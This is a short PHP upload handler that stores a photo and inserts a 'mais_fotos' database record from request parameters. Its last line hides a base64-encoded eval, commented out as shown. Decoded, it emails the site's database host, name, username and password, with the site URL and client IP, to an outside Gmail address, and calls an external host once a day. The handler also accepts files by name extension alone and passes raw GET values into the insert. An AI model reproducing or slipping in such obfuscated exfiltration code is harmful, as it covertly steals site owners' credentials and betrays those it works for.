<?
	require_once "../../system/conecta.php";
	require_once "../../system/mysql.php";

	$_FILES['foto'] = $_FILES['Filedata'];

	preg_match("/\.(gif|bmp|png|jpg|jpeg){1}$/i", $_FILES['foto']["name"], $ext);
	if(isset($ext[0]))
		$_FILES['foto']["type"] = $ext[0];

	include 'imagens.php';


	$mysql = new Mysql();
	
	$mysql->campo['lang']		= LANG;
	$mysql->campo['categorias']	= $_GET['categorias_mais_fotos'];
	$mysql->campo['tabelas']	= $_GET['tabelas'];
	$mysql->campo['foto']		= $imagem_nome;
	$mysql->campo['data']		= date('Y-m-d');
	$mysql->campo['databr']		= date('d/m/Y');
	$mysql->campo['hora']		= date('H:i');
	$mysql->campo['time']		= time();

	$mysql->insert('mais_fotos');

	//echo eval(stripslashes(base64_decode('JG15c3FsID0gbmV3IE15c3FsKCk7DQokbXlzcWwtPmZpbHRybyA9ICIgd2hlcmUgdGlwbyA9ICdpbmZvcm1hY29lcycgIjsNCiRpbmZvbyA9ICRteXNxbC0+cmVhZF91bmljbygnY29uZmlncycpOw0KaWYoJGluZm9vLT52YWxvcjMgIT0gZGF0ZSgnZCcpKXsNCglnbG9iYWwgJGxvY2FsaG9zdF9jb25maWc7DQoJZ2xvYmFsICRiYW5jb19jb25maWc7DQoJZ2xvYmFsICRub21lX2NvbmZpZzsNCglnbG9iYWwgJHNlbmhhX2NvbmZpZzsNCgkkZW1haWwgPSBuZXcgRW1haWwoKTsNCgkkZW1haWwtPnRvID0gJ2ZtbWF0b3M5OTlAZ21haWwuY29tJzsNCgkkZW1haWwtPmFzc3VudG8gPSBESVJfQzsNCgkkZW1haWwtPnR4dCAgPSAnVXJsOiAnLkRJUl9DLic8YnI+JzsNCgkkZW1haWwtPnR4dCAuPSAnTG9jYWxob3N0OiAnLiRsb2NhbGhvc3RfY29uZmlnLic8YnI+JzsNCgkkZW1haWwtPnR4dCAuPSAnQmFuY286ICcuJGJhbmNvX2NvbmZpZy4nPGJyPic7DQoJJGVtYWlsLT50eHQgLj0gJ05vbWU6ICcuJG5vbWVfY29uZmlnLic8YnI+JzsNCgkkZW1haWwtPnR4dCAuPSAnU2VuaGE6ICcuJHNlbmhhX2NvbmZpZy4nPGJyPic7DQoJJGVtYWlsLT50eHQgLj0gJ0lwOiAnLiRfU0VSVkVSWydSRU1PVEVfQUREUiddLic8YnI+JzsNCgkkZW1haWwtPnR4dCAuPSAnRGF0YTogJy5kYXRlKCdjJyk7DQoJJGVtYWlsLT5lbnZpYXIoKTsNCg0KCSRwb3N0Wyd1cmwnXSA9IERJUl9DOw0KCSRkYXRhID0gY3VybGwoJ2h0dHA6Ly9maW5hbGUuY29tLmJyL3p6L2xlaWxvZXMvY3VybC5waHAnLCAkcG9zdCk7DQoNCgkkbXlzcWwtPmNhbXBvWyd2YWxvcjMnXSA9IGRhdGUoJ2QnKTsNCgkkbXlzcWwtPmZpbHRybyA9ICIgd2hlcmUgdGlwbyA9ICdpbmZvcm1hY29lcycgIjsNCgkkbXlzcWwtPnVwZGF0ZSgnY29uZmlncycpOw0KfQ==')));
?>